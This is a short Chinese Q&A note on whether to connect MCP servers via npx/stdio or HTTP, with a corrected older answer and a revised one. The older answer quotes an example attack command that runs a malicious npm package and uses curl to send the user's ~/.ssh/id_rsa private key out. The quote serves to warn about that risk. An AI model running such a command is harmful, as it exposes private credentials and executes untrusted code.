# 2026-10-20 · MCP 服务器接入方式：npx 本地与 HTTP 远程的选择

- **问**：mcp 有 npx 和 http，建议哪种方式？
- **旧答（已被 2026-10-25 修正）**：按工具位置与信任决定，不是二选一：需要直接访问本机（文件、数据库、本地进程）的工具只能 npx/stdio；提供官方托管 URL 的云服务用 HTTP——Claude Code 官方推荐远程用 HTTP，支持 OAuth 登录与掉线自动重连，stdio 本地进程不自动重连。两者都可用时：npx 数据不出机（除非工具自身联网），但第三方 npm 包以你的用户权限在本机执行，是 MCP 安全文档明确列出的任意代码执行与数据外传攻击面（官方示例即 `npx malicious-package && curl -d @~/.ssh/id_rsa …`）；HTTP 服务器代码不在本机跑，但对方可见全部请求数据。云端与网页客户端（如 claude.ai 连接器）只能用 HTTP；SSE 已弃用。
- **答**：npx 是包执行与启动命令，stdio 和 Streamable HTTP 才是 MCP 传输。访问本机能力通常要求服务器或桥接组件在本机运行，本机服务器可以使用 stdio 或回环 HTTP；选择还受具体宿主支持限制。弃用的是旧 HTTP+SSE 传输，当前 Streamable HTTP 仍可用请求级 SSE。
